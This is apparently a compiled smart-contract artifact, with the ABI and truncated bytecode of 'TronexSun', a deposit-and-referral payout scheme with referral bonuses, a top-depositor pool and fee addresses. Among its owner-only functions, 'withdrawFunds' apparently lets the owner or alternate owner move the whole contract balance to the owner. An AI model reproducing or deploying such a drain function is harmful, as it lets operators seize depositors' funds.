{
  "contractName": "TronexSun",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "PERCENTS_DIVIDER",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "pool_balance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "admin_fee1",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "fee2",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "aff_bonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "BASE_PERCENT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "CONTRACT_BALANCE_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "pool_bonuses",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        },
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "pool_users_refs_deposits_sum",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "promo_fee",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "admin_fee2",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "pool_cycle",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_withdraw",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "pool_last_draw",
      "outputs": [
        {
          "name": "",
          "type": "uint40"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "users",
      "outputs": [
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        },
        {
          "name": "pool_bonus",
          "type": "uint256"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "deposit_payouts",
          "type": "uint256"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        },
        {
          "name": "isActive",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "alt_owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "ref_bonuses",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "team_levels",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "fee1",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "name": "pool_top",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_deposited",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "MIN_DEPOSIT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_users",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "time_period",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        },
        {
          "name": "_fee1",
          "type": "address"
        },
        {
          "name": "_fee2",
          "type": "address"
        },
        {
          "name": "_alt_owner",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "upline",
          "type": "address"
        }
      ],
      "name": "Upline",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "DirectPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "MatchPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "PoolPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdraw",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "LimitReached",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_upline",
          "type": "address"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "payoutOf",
      "outputs": [
        {
          "name": "payout",
          "type": "uint256"
        },
        {
          "name": "max_payout",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "getUserDividends",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getRate",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "maxPayoutOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "getUserBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newAdmin",
          "type": "address"
        }
      ],
      "name": "changeAdmin",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newfee1",
          "type": "address"
        }
      ],
      "name": "changeFee1",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newfee2",
          "type": "address"
        }
      ],
      "name": "changeFee2",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getAdmin",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getNow",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfo",
      "outputs": [
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        },
        {
          "name": "user_status",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "poolBonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfoTotals",
      "outputs": [
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        },
        {
          "name": "deposit_payouts",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "contractInfo",
      "outputs": [
        {
          "name": "_total_users",
          "type": "uint256"
        },
        {
          "name": "_total_deposited",
          "type": "uint256"
        },
        {
          "name": "_total_withdraw",
          "type": "uint256"
        },
        {
          "name": "_pool_last_draw",
          "type": "uint40"
        },
        {
          "name": "_pool_balance",
          "type": "uint256"
        },
        {
          "name": "_pool_lider",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "poolTopInfo",
      "outputs": [
        {
          "name": "addrs",
          "type": "address[5]"
        },
        {
          "name": "deps",
          "type": "uint256[5]"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260646004556028600555601460065542600860006101000a81548164ffffffffff021916908364ffffffffff1602179055506001600f553480156200004857600080fd5b50d380156200005657600080fd5b50d280156200006457600080fd5b5060405160808062005f0e833981018060405260808110156200008657600080fd5b8101908080519060200190929190805190602001909291908051906020019092919080519060200190929190505050836000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600e601e908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600e600a908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600e6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600e6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600e6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600e6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600e6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600e6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600e6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076028908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff1602179055505060076014908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff160217905550506007600f908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff160217905550506007600f908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff160217905550506007600a908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff160217905550505050505061594480620005ca6000396000f3fe60806040526004361061028f576000357c010000000000000000000000000000000000000000000000000000000090048063850404a11161016c578063b7d9f0d2116100de578063ca42feab11610097578063ca42feab1461129b578063de560cca146112e0578063e1e158a514611325578063e7cc62bd1461136a578063f0336a4e146113af578063f340fa01146113f45761028f565b8063b7d9f0d21461102e578063bbe4fd501461109d578063bf6e1964146110e2578063c34f457a14611127578063c609825614611192578063c864130f146112035761028f565b8063970d106f11610130578063970d106f14610d305780639a8318f414610d75578063a198341614610dba578063a87430ba14610e0d578063a9c3ac5314610f21578063b741c62a14610fbd5761028f565b8063850404a114610b3b5780638959af3c14610ba65780638da5cb5b14610c0f5780638f28397014610c805780638f7b3d5a14610ceb5761028f565b806351754084116102055780636da61d1e116101c95780636da61d1e1461088f5780636e9960c3146109155780636f9fb98a1461098657806374a88b8b146109cb57806374b95b2d14610a54578063775105e114610af65761028f565b8063517540841461070c57806362f3765e14610751578063679aefce146107965780636aabddee146107db5780636d5f6f11146108205761028f565b8063206f629611610257578063206f6296146104f657806324600fc31461053b578063277a3d4e1461056c57806339f73a48146105eb5780633ccfd60b1461065c578063477348921461068d5761028f565b806301c234a814610294578063040a772e146102d957806315c43aaf14610358578063192ef492146103ce5780631959a00214610413575b600080fd5b3480156102a057600080fd5b50d380156102ad57600080fd5b50d280156102ba57600080fd5b506102c3611438565b6040518082815260200191505060405180910390f35b3480156102e557600080fd5b50d380156102f257600080fd5b50d280156102ff57600080fd5b506103426004803603602081101561031657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061143e565b6040518082815260200191505060405180910390f35b34801561036457600080fd5b50d3801561037157600080fd5b50d2801561037e57600080fd5b50610387611728565b604051808781526020018681526020018581526020018464ffffffffff1664ffffffffff168152602001838152602001828152602001965050505050505060405180910390f35b3480156103da57600080fd5b50d380156103e757600080fd5b50d280156103f457600080fd5b506103fd6117ee565b6040518082815260200191505060405180910390f35b34801561041f57600080fd5b50d3801561042c57600080fd5b50d2801561043957600080fd5b5061047c6004803603602081101561045057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506117f4565b604051808873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018764ffffffffff1664ffffffffff16815260200186815260200185815260200184815260200183815260200182815260200197505050505050505060405180910390f35b34801561050257600080fd5b50d3801561050f57600080fd5b50d2801561051c57600080fd5b50610525611a1e565b6040518082815260200191505060405180910390f35b34801561054757600080fd5b50d3801561055457600080fd5b50d2801561056157600080fd5b5061056a611a24565b005b34801561057857600080fd5b50d3801561058557600080fd5b50d2801561059257600080fd5b506105d5600480360360208110156105a957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611bc1565b6040518082815260200191505060405180910390f35b3480156105f757600080fd5b50d3801561060457600080fd5b50d2801561061157600080fd5b5061061a611c0d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561066857600080fd5b50d3801561067557600080fd5b50d2801561068257600080fd5b5061068b611c33565b005b34801561069957600080fd5b50d380156106a657600080fd5b50d280156106b357600080fd5b506106f6600480360360208110156106ca57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612805565b6040518082815260200191505060405180910390f35b34801561071857600080fd5b50d3801561072557600080fd5b50d2801561073257600080fd5b5061073b612e58565b6040518082815260200191505060405180910390f35b34801561075d57600080fd5b50d3801561076a57600080fd5b50d2801561077757600080fd5b50610780612e5d565b6040518082815260200191505060405180910390f35b3480156107a257600080fd5b50d380156107af57600080fd5b50d280156107bc57600080fd5b506107c5612e62565b6040518082815260200191505060405180910390f35b3480156107e757600080fd5b50d380156107f457600080fd5b50d2801561080157600080fd5b5061080a612ee0565b6040518082815260200191505060405180910390f35b34801561082c57600080fd5b50d3801561083957600080fd5b50d2801561084657600080fd5b506108736004803603602081101561085d57600080fd5b8101908080359060200190929190505050612ee7565b604051808260ff1660ff16815260200191505060405180910390f35b34801561089b57600080fd5b50d380156108a857600080fd5b50d280156108b557600080fd5b506108f8600480360360208110156108cc57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612f1a565b604051808381526020018281526020019250505060405180910390f35b34801561092157600080fd5b50d3801561092e57600080fd5b50d2801561093b57600080fd5b506109446131fd565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561099257600080fd5b50d3801561099f57600080fd5b50d280156109ac57600080fd5b506109b5613226565b6040518082815260200191505060405180910390f35b3480156109d757600080fd5b50d380156109e457600080fd5b50d280156109f157600080fd5b50610a3e60048036036040811015610a0857600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050613245565b6040518082815260200191505060405180910390f35b348015610a6057600080fd5b50d38015610a6d57600080fd5b50d28015610a7a57600080fd5b50610abd60048036036020811015610a9157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061326a565b60405180878152602001868152602001858152602001848152602001838152602001828152602001965050505050505060405180910390f35b348015610b0257600080fd5b50d38015610b0f57600080fd5b50d28015610b1c57600080fd5b50610b2561341a565b6040518082815260200191505060405180910390f35b348015610b4757600080fd5b50d38015610b5457600080fd5b50d28015610b6157600080fd5b50610ba460048036036020811015610b7857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050613420565b005b348015610bb257600080fd5b50d38015610bbf57600080fd5b50d28015610bcc57600080fd5b50610bf960048036036020811015610be357600080fd5b81019080803590602001909291905050506135d8565b6040518082815260200191505060405180910390f35b348015610c1b57600080fd5b50d38015610c2857600080fd5b50d28015610c3557600080fd5b50610c3e6135f2565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b348015610c8c57600080fd5b50d38015610c9957600080fd5b50d28015610ca657600080fd5b50610ce960048036036020811015610cbd57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050613617565b005b348015610cf757600080fd5b50d38015610d0457600080fd5b50d28015610d1157600080fd5b50610d1a613776565b6040518082815260200191505060405180910390f35b348015610d3c57600080fd5b50d38015610d4957600080fd5b50d28015610d5657600080fd5b50610d5f61377c565b6040518082815260200191505060405180910390f35b348015610d8157600080fd5b50d38015610d8e57600080fd5b50d28015610d9b57600080fd5b50610da4613782565b6040518082815260200191505060405180910390f35b348015610dc657600080fd5b50d38015610dd357600080fd5b50d28015610de057600080fd5b50610de9613788565b604051808264ffffffffff1664ffffffffff16815260200191505060405180910390f35b348015610e1957600080fd5b50d38015610e2657600080fd5b50d28015610e3357600080fd5b50610e7660048036036020811015610e4a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061379f565b604051808f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018e81526020018d81526020018c81526020018b81526020018a81526020018981526020018881526020018764ffffffffff1664ffffffffff1681526020018681526020018581526020018481526020018381526020018281526020019e50505050505050505050505050505060405180910390f35b348015610f2d57600080fd5b50d38015610f3a57600080fd5b50d28015610f4757600080fd5b50610f5061383c565b6040518083600560200280838360005b83811015610f7b578082015181840152602081019050610f60565b5050505090500182600560200280838360005b83811015610fa9578082015181840152602081019050610f8e565b505050509050019250505060405180910390f35b348015610fc957600080fd5b50d38015610fd657600080fd5b50d28015610fe357600080fd5b50610fec613a0f565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561103a57600080fd5b50d3801561104757600080fd5b50d2801561105457600080fd5b506110816004803603602081101561106b57600080fd5b8101908080359060200190929190505050613a35565b604051808260ff1660ff16815260200191505060405180910390f35b3480156110a957600080fd5b50d380156110b657600080fd5b50d280156110c357600080fd5b506110cc613a68565b6040518082815260200191505060405180910390f35b3480156110ee57600080fd5b50d380156110fb57600080fd5b50d2801561110857600080fd5b50611111613a70565b6040518082815260200191505060405180910390f35b34801561113357600080fd5b50d3801561114057600080fd5b50d2801561114d57600080fd5b506111906004803603602081101561116457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050613a75565b005b34801561119e57600080fd5b50d380156111ab57600080fd5b50d280156111b857600080fd5b506111c1613bd6565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561120f57600080fd5b50d3801561121c57600080fd5b50d2801561122957600080fd5b506112596004803603602081101561124057600080fd5b81019080803560ff169060200190929190505050613bfc565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156112a757600080fd5b50d380156112b457600080fd5b50d280156112c157600080fd5b506112ca613c2f565b6040518082815260200191505060405180910390f35b3480156112ec57600080fd5b50d380156112f957600080fd5b50d2801561130657600080fd5b5061130f613ca4565b6040518082815260200191505060405180910390f35b34801561133157600080fd5b50d3801561133e57600080fd5b50d2801561134b57600080fd5b50611354613caa565b6040518082815260200191505060405180910390f35b34801561137657600080fd5b50d3801561138357600080fd5b50d2801561139057600080fd5b50611399613cb1565b6040518082815260200191505060405180910390f35b3480156113bb57600080fd5b50d380156113c857600080fd5b50d280156113d557600080fd5b506113de613cb7565b6040518082815260200191505060405180910390f35b6114366004803603602081101561140a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050613cbd565b005b61271081565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b1580156114f057600080fd5b505afa158015611504573d6000803e3d6000fd5b505050506040513d602081101561151a57600080fd5b810190808051906020019092919050505090506000611537613cd4565b9050600082600d60008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070154101561171d57600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015461271061012c600d60008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff16420381151561163457fe5b0484600d60008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154020281151561168457fe5b040390508281600d60008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015401111561171c57600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070154830390505b5b809350505050919050565b600080600080600080600f54601054601154600860009054906101000a900464ffffffffff16600a54600b600060095481526020019081526020016000206000600c60008060ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054955095509550955095509550909192939495565b600a5481565b6000806000806000806000600d60008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600d60008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff16600d60008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154600d60008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154600d60008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154600d60008e73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154600d60008f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600d01549650965096509650965096509650919395979092949650565b60055481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480611acc5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515611b40576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015611bbe573d6000803e3d6000fd5b50565b6000600d60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501549050919050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000803073ffffffffffffffffffffffffffffffffffffffff16636da61d1e336040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b158015611cce57600080fd5b505afa158015611ce2573d6000803e3d6000fd5b505050506040513d6040811015611cf857600080fd5b8101908080519060200190929190805190602001909291905050509150915080600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154101515611dd0576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600c8152602001807f46756c6c207061796f757473000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000821115611f18578082600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115611e6d57600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154810391505b81600d60